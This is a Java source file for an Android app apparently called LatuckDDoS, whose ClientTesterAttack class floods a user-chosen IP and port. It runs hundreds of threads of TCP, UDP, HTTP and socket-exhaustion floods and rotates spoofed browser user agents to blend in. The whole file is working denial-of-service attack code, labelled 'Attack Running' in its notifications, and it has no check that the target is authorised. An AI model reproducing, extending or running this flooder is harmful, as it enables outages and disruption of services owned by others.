package dev.squatedev.latuckddos.ClientTester;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.squate.interfaces.AttackCallback;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.io.OutputStream;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class ClientTesterAttack {
    private static ClientTesterAttack instance;
    private Context context;
    private String tag = "LatuckDDos";
    private Random random = new Random();
    private ExecutorService attackPool;
    private AtomicInteger activeAttacks = new AtomicInteger(0);
    private AtomicBoolean isRunning = new AtomicBoolean(false);
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private AttackCallback callback;

    private int totalPacketsSent = 0;
    private int totalConnections = 0;
    private int delayMs = 100;

    private NotificationManager notificationManager;
    private static final String CHANNEL_ID = "attack_channel";
    private static final int NOTIFICATION_ID = 1337;
    private String currentIp = "";
    private String currentPort = "";

    private ClientTesterAttack(Context context){
        if(context != null){
            this.context = context;
            notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
            createNotificationChannel();
        }
        attackPool = Executors.newFixedThreadPool(300);
    }

    public static synchronized ClientTesterAttack getInstance(Context ctx) {
        if(instance == null) instance = new ClientTesterAttack(ctx);
        return instance;
    }

    public void setCallback(AttackCallback callback) {
        this.callback = callback;
    }

    public void setDelay(int delayMs) {
        this.delayMs = Math.max(1, Math.min(delayMs, 1000));
    }

    public int getDelay() {
        return delayMs;
    }

    public void startAttack(String ip, String port) {
        if(isRunning.get()) return;
        isRunning.set(true);

        currentIp = ip;
        currentPort = port;

        showNotification();

        for(int i = 0; i < 50; i++) {
            send(ip, port);
        }

        updateStatus("🔥 ATTACK STARTED ON " + ip + ":" + port);
    }

    public void stopAttack() {
        isRunning.set(false);
        attackPool.shutdownNow();
        try {
            if(!attackPool.awaitTermination(3, TimeUnit.SECONDS)) {
                attackPool.shutdownNow();
            }
        } catch (InterruptedException e) {
            attackPool.shutdownNow();
        }

        attackPool = Executors.newFixedThreadPool(300);
        activeAttacks.set(0);
        totalPacketsSent = 0;
        totalConnections = 0;

        hideNotification();

        updateStatus("⛔ ATTACK STOPPED");
        if(callback != null) {
            callback.onStatsUpdate(0, 0);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Attack Status",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Shows attack progress");
            notificationManager.createNotificationChannel(channel);
        }
    }

    private void showNotification() {
        Intent intent = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
        PendingIntent pendingIntent = PendingIntent.getActivity(
                context,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, CHANNEL_ID)
                .setContentTitle("🔥 Attack Running")
                .setContentText("Target: " + currentIp + ":" + currentPort)
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(Notification.CATEGORY_SERVICE);

        notificationManager.notify(NOTIFICATION_ID, builder.build());
    }

    private void updateNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, CHANNEL_ID)
                .setContentTitle("🔥 Attack Running")
                .setContentText("Packets: " + totalPacketsSent + " | Connections: " + totalConnections)
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(Notification.CATEGORY_SERVICE);

        notificationManager.notify(NOTIFICATION_ID, builder.build());
    }

    private void hideNotification() {
        notificationManager.cancel(NOTIFICATION_ID);
    }

    private void send(String ip, String port) {
        if(!isRunning.get()) return;

        attackPool.execute(() -> {
            if(!isRunning.get()) return;

            try {
                int attackType = random.nextInt(5);
                switch(attackType) {
                    case 0: sendTcpFlood(ip, port); break;
                    case 1: sendUdpFlood(ip, port); break;
                    case 2: sendHttpFlood(ip, port); break;
                    case 3: sendMixedPacket(ip, port); break;
                    case 4: sendRapidFire(ip, port); break;
                }
            } catch (Exception e) {
                Log.e(tag, "Attack error: " + e.getMessage());
            }

            activeAttacks.decrementAndGet();

            if(isRunning.get() && activeAttacks.get() < 30) {
                try {
                    Thread.sleep(delayMs);
                } catch (InterruptedException e) {
                    return;
                }
                for(int i = 0; i < 10; i++) {
                    send(ip, port);
                }
            }
        });

        activeAttacks.incrementAndGet();
    }

    private void sendTcpFlood(String ip, String port) {
        try {
            int portNum = Integer.parseInt(port);

            for(int i = 0; i < 20 && isRunning.get(); i++) {
                try {
                    Socket socket = new Socket();
                    socket.setTcpNoDelay(true);
                    socket.setSoTimeout(100);
                    socket.connect(new InetSocketAddress(ip, portNum), 50);

                    OutputStream out = socket.getOutputStream();
                    byte[] data = new byte[1024];
                    random.nextBytes(data);
                    out.write(data);
                    out.flush();

                    socket.close();
                    totalConnections++;

                    Thread.sleep(delayMs / 10);
                } catch (Exception e) {
                }
            }

            if(callback != null && totalConnections % 100 == 0) {
                callback.onStatsUpdate(totalPacketsSent, totalConnections);
                updateNotification();
            }

        } catch (Exception e) {
        }
    }

    private void sendUdpFlood(String ip, String port) {
        try {
            int portNum = Integer.parseInt(port);
            DatagramSocket udpSocket = new DatagramSocket();
            udpSocket.setSoTimeout(100);

            byte[] buffer = new byte[4096];
            random.nextBytes(buffer);

            for(int i = 0; i < 50 && isRunning.get(); i++) {
                try {
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length,
                            new InetSocketAddress(ip, portNum));
                    udpSocket.send(packet);
                    totalPacketsSent++;

                    Thread.sleep(delayMs / 20);
                } catch (Exception e) {
                }
            }

            udpSocket.close();

            if(callback != null && totalPacketsSent % 200 == 0) {
                callback.onStatsUpdate(totalPacketsSent, totalConnections);
                updateNotification();
            }

        } catch (Exception e) {
        }
    }

    private void sendHttpFlood(String ip, String port) {
        try {
            int portNum = Integer.parseInt(port);

            String[] paths = {"/", "/wp-admin", "/admin", "/login", "/api", "/.env", "/config"};
            String[] methods = {"GET", "POST", "HEAD"};

            for(int i = 0; i < 15 && isRunning.get(); i++) {
                try {
                    Socket socket = new Socket();
                    socket.setTcpNoDelay(true);
                    socket.connect(new InetSocketAddress(ip, portNum), 100);

                    OutputStream out = socket.getOutputStream();
                    String path = paths[random.nextInt(paths.length)];
                    String method = methods[random.nextInt(methods.length)];

                    String request = method + " " + path + " HTTP/1.1\r\n" +
                            "Host: " + ip + "\r\n" +
                            "User-Agent: " + getRandomUserAgent() + "\r\n" +
                            "Accept: */*\r\n" +
                            "Connection: close\r\n" +
                            "\r\n";

                    out.write(request.getBytes());
                    out.flush();
                    socket.close();
                    totalConnections++;

                    Thread.sleep(delayMs / 15);
                } catch (Exception e) {
                }
            }

        } catch (Exception e) {
        }
    }

    private void sendMixedPacket(String ip, String port) {
        try {
            int portNum = Integer.parseInt(port);

            for(int i = 0; i < 30 && isRunning.get(); i++) {
                try {
                    if(random.nextBoolean()) {
                        Socket socket = new Socket();
                        socket.setTcpNoDelay(true);
                        socket.connect(new InetSocketAddress(ip, portNum), 50);
                        socket.close();
                    } else {
                        DatagramSocket udpSocket = new DatagramSocket();
                        byte[] buffer = new byte[2048];
                        random.nextBytes(buffer);
                        DatagramPacket packet = new DatagramPacket(buffer, buffer.length,
                                new InetSocketAddress(ip, portNum));
                        udpSocket.send(packet);
                        udpSocket.close();
                        totalPacketsSent++;
                    }
                    totalConnections++;

                    Thread.sleep(delayMs / 25);
                } catch (Exception e) {
                }
            }

        } catch (Exception e) {
        }
    }

    private void sendRapidFire(String ip, String port) {
        try {
            int portNum = Integer.parseInt(port);

            Socket[] sockets = new Socket[50];
            for(int i = 0; i < 50 && isRunning.get(); i++) {
                try {
                    sockets[i] = new Socket();
                    sockets[i].setTcpNoDelay(true);
                    sockets[i].connect(new InetSocketAddress(ip, portNum), 30);
                    totalConnections++;

                    Thread.sleep(delayMs / 50);
                } catch (Exception e) {
                }
            }

            for(int i = 0; i < 50 && isRunning.get(); i++) {
                try {
                    if(sockets[i] != null && sockets[i].isConnected()) {
                        OutputStream out = sockets[i].getOutputStream();
                        byte[] data = new byte[512];
                        random.nextBytes(data);
                        out.write(data);
                        out.flush();
                        sockets[i].close();
                    }
                } catch (Exception e) {
                }
            }

        } catch (Exception e) {
        }
    }

    private String getRandomUserAgent() {
        String[] agents = {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6; rv:135.0) Gecko/20100101 Firefox/135.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6; rv:134.0) Gecko/20100101 Firefox/134.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6; rv:133.0) Gecko/20100101 Firefox/133.0",
                "Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 15; SM-S938U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 15; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 14; SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 15; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 15; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPad; CPU OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Linux; Android 15; SM-T970) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 14; SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 OPR/111.0.0.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/110.0.0.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 OPR/111.0.0.0",
                "Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36 OPR/85.0.0.0",
                "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36 OPR/84.0.0.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Vivaldi/7.0.3495.26",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Vivaldi/6.9.3447.54",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Vivaldi/7.0.3495.26",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Brave/1.73.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Brave/1.73.0",
                "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36 Brave/1.73.0",
                "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
        };
        return agents[random.nextInt(agents.length)];
    }

    private void updateStatus(String status) {
        mainHandler.post(() -> {
            if(callback != null) {
                callback.onStatusUpdate(status);
            }
        });
    }

    public boolean isRunning() {
        return isRunning.get();
    }
}